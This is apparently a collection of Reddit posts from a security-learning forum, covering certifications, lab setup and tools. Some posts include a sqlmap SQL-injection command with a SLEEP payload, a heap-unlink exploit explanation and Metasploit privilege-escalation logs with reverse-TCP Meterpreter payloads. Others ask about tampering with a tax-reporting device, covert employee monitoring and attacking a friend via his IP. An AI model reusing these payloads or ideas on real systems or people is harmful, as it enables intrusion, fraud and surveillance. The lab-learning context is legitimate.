            "selftext": "The main concern to begin a career in Cybersecurity is understanding how to start. Internet is a wonderful media, but having access to so much information with no control is like having no access at all. What path could provide the tools to become a self-sufficient Security expert in the shortest time? I imagine plenty of wannabe professionals living the same discomfort, feeling completely alone between thousands of Subject Experts.\n\nWhen I first stumbled upon Security, it was trough \u201cCaesar Cipher\u201d. For me, it seemed the most exciting thing in the world and that day I decided I would have spent all my time unveiled all secrets behind Cybersecurity. Unfortunately, life has taken me on different paths, too far from the object of my ambition. I had two options: to accept it or fight for it! How easy would my life be had I been able to let things go. \n\nHow could I steer it again in the right direction? I remember myself analyzing plenty of CVs to find out what path other people had followed to get where they were. They must have started from somewhere, right? Maybe if I had been able to mimic their choices I would have arrived there, too. Finally, my eye fell onto an unknown certification: **eLearnSecurity Certified Professional Penetration Tester (eCPPT)**. Never heard of it! I found out a colleague of mine had already completed it and strongly suggested me to try. Buzzwords like \u201cpractical\u201d, \u201clabs\u201d, \u201chands-on\u201d were still echoing in my mind. So, I bought it. No trials, no reviews, just faith in work relationships, the foundation to become Security professionals. \n\nMy impressions in brief:\n\n- **CHEAP:** I could afford it. That\u2019s it! InfoSec certifications usually assume your organization would pay for them, but this is not the case and I think trade-off cost-benefits is really worth a try.\n\n- **EXHAUSTIVE:** The course includes everything you need to start your Cybersecurity career. Divided into 5 modules (Web, Network, System, Metasploit and WiFi), it offers PDFs, videos, codes and any kind of additional material to ease the learning process as much as possible. It felt like owning a personal library always available and ready to be consulted. Additionally, some of provided knowledges (such as Shellcoding or Buffer Overflow) are totally enabling to other Security advanced certifications and topics.\n\n- **SELF-SUFFICIENT:** No particular previous knowledge is required. The course does not take anything for granted and effectively explain all requirements needed to completely understand discussed topics with an impressive level of detail. The overall feeling is that nothing is there for no reason. \n\n- **PRACTICAL:** Labs, labs, labs and labs again. Paper-Security is not effective if not put into practice. What did Beckett say? \u201cEver tried. Ever failed. No matter. Try Again. Fail again. Fail better.\u201d\n\n- **APPEALING:** The course offers a perfect balance between text and graphics, in the idea that visual representation is a better way to pin concepts than hundreds of words.\n\nBetween the infinity of tools and certifications, I will always remember eCPPT course as the first true step I have taken in my professional career. What really gave me the self-confidence to try mastering this complex and deep subject. \n\nSecurity is all about knowledge and experience. Mostly important, security is a method where everyone can give a real contribution in his own way. No shortcuts. No definite roads. Only knowledge and confidence. Do not take anything for granted; deepen, contaminate, learn, trust in yourself, with a clear idea of the direction you intend to take.\n\nIt won\u2019t be easy. You can decide to give up or try. Your choice.",

I would like to try this VM out as well, but I am having really hard times getting it to work properly for some reason. Here is my current setup:\n\n-I am running VM Workstation 12 Pro on a Windows 10 Pro host.  \n\n-I am running PfSense VM with WAN and LAN interfaces as my virtual router. PFSense assigns IP addresses to hosts on this LAN via DHCP.  \n\n-My Kali Linux VM is configured to use the same LAN Segment as the LAN on my PFSense. Kali Linux gets an IP address via DHCP from PFSense.  \n\n-Kioptrix VM is configured with the same network settings (LAN Segment) as my Kali Linux VM, but for some reason does not get an IP address assigned by DHCP, or at least I am not able to discover it when I do a network scan (netdiscover or nmap). \n \n-I have also tried setting up Kioptrix on Virtual Box and connecting it to NAT Network with DHCP, but had similar results.  \n\nHave any of you ran into similar issues? If so, what steps did you take to make it work properly. Any advice would be appreciated. \n\nThank you in advance,\nQikP\n\n\n\n",

Im doing this for something that like a ctf. anyway the poc of the exploit is pretty simple, the parameters are very similar to the one i have for my target box. I ran tests specifically to test the payload but i keep getting 403 errors. the target url is up and running without problems. everything should work correctly but its not. Since this is a mock, i can run test all out. i have the testing flags of level and risk set to max and verbose to tell me if there should be any errors. I have the test-filter flag for testing the two specific payloads along with the -p flag for the vul parameter. The vulnerability is for the kittycatfish plugin in wordpress. Im running \"sqlmap -u 'http://192.168.101.10/wp-content/plugins/kittycatfish-2.2/kittycatfish.js.php?kc_ad=16&ver=2.0' --threads=7 --random-agent --dbms=mysql --test-filter='kc_ad=16 AND (SELECT * FROM (SELECT(SLEEP(5)))xzZh)&ver=2.0' --flush-session -v4 --level=5 --risk=3 -p kc_ad\" as my command for sqlmap, its just one of them as an example. the poc is very similar to those parameters. the mock im doing has a form but its from a foreign country so the english thread is dead. Here is link to exploit [poc](https://www.exploit-db.com/exploits/41919/)\n\n",

The thrid word (which becomes fd needs to be the adress of (CH1 - 12) and the forth word is the shellcode adress.\n\nNow when you call free(CH1) it checks if there is a chunk before CH1 ( which is not true as CH1 is the first one ). Than it wants to check if CH2 is in use or not, therefore adding the size of CH1 to the pointer to CH1 ( which results into adress of CH2) now it adds the (faked) size CH2_size (-4), which redirect it to th word CH2_prevsize ( however the code thinks this is CH3_prevsize ) as this the last bit is 0 he thinks, that CH2 is free.\n\n\nFinnaly the pointer magic starts:\nNow he wants to unlink the CH2.\nTherefore the thrd word of CH2 (fd) is saved into FD and the fouth word ( bd) is saved into BK.\nNow BK is coped to FD+12 ( which is free_adress-12+12 => free_adress) therefore the value which was in the 4th word of CH2 is now the first word of CH1 ( prev_size) ?\n\nNow when calling free(CH2) it calls the shellcode.

Maybe set a route from B to R ? \n```\nroute add 192.168.1.3 192.168.1.1\n``` \nIt seems like it's wrong, as I get a message that Error: either \"to\" is duplicate, or \"192.168.1.1\" is a garbage.\n\nAny ideas ?",

What the box supposedly does is captures all receipts as a text file and sends it to a server.\n\nMy question is there a way to detect what is actually being sent to their server? Am i able to get a local copy of ALL the data that is being sent out via is box? and would I be able to change the code so the box is sending out some of the receipts and have a local record of which ones they are sending out?\n\nThere are a lot of holes in this particular project, no one in Laos has answers to my general questions about this device (I asked for sample data it sends out to their servers, that was a no go). I'm assuming the project with eventually fail but in the mean time i'm trying to figure out a workaround for it because several of my companies are being hit with this unreasonable tax hike.\n\nAny suggestions or pointing me in the right direction would be great.\n\nThanks Redditors!\n\nEdit: formatting",

Meterpreter \"getsystem\" doesn't work; it returns \"priv_elevate_getsystem: Operation failed: The environment is incorrect.\"\n\nI've found a local exploit and payload which I think should do it; here's an output of my settings and trying to run it:\n\n    msf exploit(ms16_032_secondary_logon_handle_privesc) > show options \n    \t\n    Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):\n    \n       Name     Current Setting  Required  Description\n       ----     ---------------  --------  -----------\n       SESSION  1                yes       The session to run this module on.\n    \n    \n    Payload options (windows/x64/meterpreter/reverse_tcp):\n    \n       Name      Current Setting  Required  Description\n       ----      ---------------  --------  -----------\n       EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)\n       LHOST     10.10.15.162     yes       The listen address\n       LPORT     4444             yes       The listen port\n    \n    \n    Exploit target:\n    \n       Id  Name\n       --  ----\n       0   Windows x86\n    \n    \n    msf exploit(ms16_032_secondary_logon_handle_privesc) > exploit \n    \n    [*] Started reverse TCP handler on 10.10.15.162:4444 \n    [!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell\n    [*] Writing payload file, C:\\Users\\user1\\Desktop\\byNsspY.txt...\n    [*] Compressing script contents...\n    [+] Compressed size: 3588\n    [*] Executing exploit script...\n    [+] Cleaned up C:\\Users\\user1\\Desktop\\byNsspY.txt\n    [*] Exploit completed, but no session was created.\n\nSo that didn't seem to work. I'm guessing it's because of \"Executing 32-bit payload on 64-bit ARCH\"(?). My meterpreter session's type shows as \"x86/windows\". I came across a few resources [like this](https://security.stackexchange.com/questions/83350/how-do-you-send-a-64-bit-meterpreter-stager?rq=1), which explain that you can migrate a 32-bit meterpreter session to a 64-bit one, so I've been trying that:\n\n    msf exploit(ms16_032_secondary_logon_handle_privesc) > use exploit/windows/local/payload_inject\n    msf exploit(payload_inject) > set payload windows/x64/meterpreter/reverse_tcp\n    payload => windows/x64/meterpreter/reverse_tcp\n    msf exploit(payload_inject) > exploit \n    \n    [-] Handler failed to bind to 10.10.10.10:4444:-  -\n    [*] Started reverse TCP handler on 0.0.0.0:4444 \n    [*] Running module against MACHINE1\n    [-] PID  does not actually exist.\n    [*] Launching notepad.exe...\n    [*] Preparing 'windows/x64/meterpreter/reverse_tcp' for PID 2684\n    [*] Exploit completed, but no session was created.\n\nI thought that might be normal - no new session created, so I'll just try migrating my existing one to that new PID:\n\n    msf exploit(payload_inject) > sessions 1\n    [*] Starting interaction with 1...\n    \n    meterpreter > migrate 2684\n    [*] Migrating from 2576 to 2684...\n    [-] Error running command migrate: Rex::RuntimeError Cannot migrate into non existent process\n\nBalls. So I try telling that exploit to create a new process, and then migrating to that, just in case:\n\n    msf exploit(payload_inject) > set newprocess true \n    newprocess => true\n    msf exploit(payload_inject) > exploit \n    \n    [-] Handler failed to bind to 10.10.10.10:4444:-  -\n    [*] Started reverse TCP handler on 0.0.0.0:4444 \n    [*] Running module against MACHINE1\n    [*] Launching notepad.exe...\n    [*] Preparing 'windows/x64/meterpreter/reverse_tcp' for PID 1136\n    [*] Exploit completed, but no session was created.\n    msf exploit(payload_inject) > sessions 1\n    [*] Starting interaction with 1...\n    \n    meterpreter > migrate 1136\n    [*] Migrating from 2576 to 1136...\n    [-] Error running command migrate: Rex::RuntimeError Cannot migrate into non existent process\n\nBalls again. I've tried a few other things, but I'm a bit stumped for now. Any pointers as to what you'd try next?\n\nThanks :)",

It almost seems that they frown upon candidates that are not already in the industry.\n\nMy question is this: **If you were in my shoes, would you pursue a certification, and if so, which?  (Sec+, CEH, OSCP)**\n\nI've read up on the OSCP, and while this would be awesome to pursue, I would wait until an employer sponsored the study and exam. The labs are necessary for success and I would need some (working) time and financial support to attack it.\n\nAny advice would be appreciated.",

            "selftext": "Hey all,\n\nSo this may not necessarily be about the *how* part of some hacking, but more so some logistics of testing. After digging heavily into the network side of things with security, I've started to turn my attention toward the web app side of things. I've got a pretty good hang on the basic concepts of SQLi, XSS, that sort of thing. And so recently  I've been pouring over the entries on exploit-db.com, the web app section in particular. I can usually get the gist of what the tester has done to identify/prove the vulnerability. What I can't quite envision is exactly how some of these people are doing the actual testing. Surely they're not actually directly attacking the site and service directly, a-la blackhat, right? I mean there's one contributor there who seems to be just banging out multiple submissions daily. I won't call out with names, but visit the site and you'll see pretty quickly.\n\nHere's my loose guess at how one might get to test these things; maybe someone here can tell me if I'm close to the mark or not. Let's take SQLi for instance. Many or all of these exploit submissions include links to a plugin on the site(s) which they have found vulnerable. Also, usually there's a link to a demo of the plugin. So, are they maybe downloading these plugins, somehow setting them up to function with a home-lab SQL database they've created, and then essentially attempting to hack their own DB through the vectors available in that plugin? Like doing it all through a locally hosted test web site?\n\nAnyway, hopefully what I'm asking makes sense. I'd love to be able to try testing some of these things in a legitimate manner, if I could wrap my head around the setup part. DVWA, bWAPP, and all those things are great, but I feel like they lack the quirks and... realness?... of real-world environments.\n\nThanks in advance for any assistance or clarification!",

I tried getting help at /r/hacking but no luck. \n\nSo yesterday I was at a nightclub with some friends, one of them was pretty wasted so three of my friends took her to the bathroom, and they left their purse on the table. I wasn't paying any attention to their purses but apparently, someone left a phone (Samsung Galaxy S3) inside of one of my friend purse. We just noticed that today.\nIts pattern blocked and I don't know if is possible to bypass it, but its a pretty extrange scenario, why someone would leave a perfectly working phone in someone else purse? I want to figure out the pattern so I can check if it was a mistake and maybe I can some find contact info to give it back.\n\nWould you guys please help?",

It's been an itch on my brain for some time now, so I'd really appreciate it if **someone knowledgeable** could point me in the right direction. From previous research I have some questions:\n\n* In theory, would it be possible to append the hex output of, say, a .jpg to a .pdf, to have the jpg open with the pdf?\n\n* The first three letters of a file's hex usually dictate the type of format execution that will be provided - Wouldn't this prevent the jpg from opening, as it would be looking for pdf-compatible code?\n\nThanks in advance.",

It would be even better if I can actually see screenshots or whatever text people are writing. \n\nHe doesn't simply want to block facebook and things as sometimes people use it for work, but he wants to make sure they aren't on personal accounts. \n\nEven more annoying, this guy wants it to be hidden from his employees, so no pop ups saying they're being watched or antiviruses catching it and telling them something is going on. There may be legal issues here which I am looking into. Essentially he wants advanced parental controls because he doesn't trust his employees. The last time I repaired a work laptop for him it was full of porn, so I understand why. \n\nAny ideas? \n\nAt the moment I'm looking at Surveilstar, but I'm not totally confident on setting up a server for that. I was told Wireshark is great, but I can't seem to find out if it's what I'm looking for as the traffic needs to be readable by him and not me.\n\nThanks for the help.

I have not tested all, I will let you peeps take care of that. \nNow that we got that out of the way, how to install kali linux ON windows without running a vm:\n\n1.\tSearch for windows insider settings on windows, you need to sign up for the windows insider program and install the latest stable build of windows to have this work as we use the beta feature \u201clinux subsystem\u201d to achieve this. \n\n2.\tAfter having installed the latest windows insider build, go into an elevated powershell and type in the command \u201cEnable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux\u201d (without the quotation marks) and click enter, now after the installation is complete type y and click enter to the restart prompt.\n\n3.\tAfter the restart open a elevated cmd windows and type in the command \u201clxrun /install /y\u201d. this will install the ubuntu base for the kali linux install with the default user as root and without password.\n\n4.\tOnce the installation is complete, go into the searchbar on windows and type in bash, you should then get a result called \u201cbash on ubuntu on windows\u201d. Open this and you should get a linux terminal which is logged into root.\n\n5.\tType in the command \u201capt-get update\u201d and then after that type in \u201capt-get dist-upgrade -y\u201d, this will update the ubuntu system and its preinstalled tools to the newest version\n\n6.\tWhen the update is complete type the command \u201capt-get install python2.7 -y\u201d and when that is finished type the command \u201cgit clone https://github.com/LionSec/katoolin.git\u201d this will download the tool that installs kali linux\n\n7.\tNow type the command \u201cpython2.7 katoolin/katoolin.py\u201d. this will start the katoolin tool. \n\n8.\tOpen the \u201cAdd Kali repositories & Update\u201d then \u201cAdd Kali linux repositories\u201d and  then \u201cupdate\u201d. Then click ctrl+c and type \u201cpython2.7 katoolin/katoolin.py\u201d again.\n\n9.\tThen go to \u201cview categories\u201d and then click 0 and enter to install all kali linux tools.\n\n10.\tOnce that finishes then you are done. You can now use all the kali linux tools. Kali linux also has direct acces to your networking so anything that requires that you connect to this install works just like a normal kali linux install.\n\nYou are now done. Tell me if you want pictures to the steps for better guidance. \n\nedit: i posted this on r/hacking as well, just thought it fitted here too\n",

So I'm probably going to sell my gaming laptop and get something else to use for the remainder of my education. \n\nCurrently, I'm looking at the HP Spectre x360 15t 2017 or the Dell XPS 15. \nOf course, I'll get either outfitted with 16gbs of RAM and the highest capacity SSD I can get. \nI thought about a MacBook, but, first of all, I really don't like OSX and I like the price even less.\n\nSo what are your suggestions, what do you use in your everyday security life?",

Also I have much personal info having known him for some time & also his IP address is logged each time he connects to Plex. \n\nI assume Plex has much security to prevent against attacks and whatnot, but given the information I have - what actually could be feasibly done? \n\nI told him that its not quite so simple as they make it out to be in the media, but is the information enough to form some sort of attack?
